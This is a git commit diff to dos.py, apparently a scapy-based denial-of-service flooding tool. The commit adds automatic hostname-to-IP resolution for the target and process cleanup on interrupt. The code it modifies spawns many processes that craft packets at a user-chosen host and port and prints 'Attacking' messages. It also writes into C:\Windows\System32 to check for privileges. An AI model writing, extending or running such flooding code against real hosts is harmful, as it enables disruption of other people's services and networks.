4b254499b811528e9f1c2958cd0678ff248a5066
Justaus3r <72691864+Justaus3r@users.noreply.github.com>
2021-08-15 23:35:56 +0500

    Feat:Add host-to-ip autochanger

--- dos.py
+++ dos.py
@@ -1,4 +1,5 @@
 from scapy.all import *
+import socket
 import sys
 from multiprocessing import Process
 import random
@@ -61,6 +62,8 @@ banner =[
 ]
 
 __banner__ = random.choice(banner)
+
+
 if os.name == 'nt':
     try:
         with open(r'C:\Windows\System32\Tempo.txt','w') as writetempfile:
@@ -73,10 +76,22 @@ else:
         print(f"{colors.red}Please run the script as prviliged user{colors.color_end}")
         sys.exit(1)
 
-
-
+def get_ip(hostname):
+    try:
+        ip = socket.gethostbyname(hostname)
+    except socket.gaierror:
+        ip = '0'
+    return ip
 try:
-    DEST_IP = sys.argv[1]
+    try:
+        DEST_IP = sys.argv[1]
+        socket.inet_aton(DEST_IP)
+    except socket.error:
+        DEST_IP = get_ip(DEST_IP)
+        if DEST_IP == '0':
+            print(f'{colors.red}Error:Not a valid host or ip address.{colors.color_end}')
+            sys.exit()
+
     DEST_PORT = int(sys.argv[2])
     proces = int(sys.argv[3])
     type = sys.argv[4]
@@ -111,8 +126,16 @@ def craftpkt(DEST_IP, DEST_PORT,type):
 print(__banner__)
 print(f"{colors.cyan}Attacking {DEST_IP} on port {DEST_PORT} with {proces} processes{colors.color_end}")
 try:
+    process_list = []
     for _ in range(proces):
         _process = Process(target=craftpkt, args=(DEST_IP,DEST_PORT,type))
+        process_list.append(_process)
         _process.start()
 except KeyboardInterrupt:
+    print(f"{colors.green}Cleaning up!..{colors.color_end}")
+    for _process in process_list:
+        try:
+            _process.terminate()
+        except Exception:
+            continue    
     sys.exit()
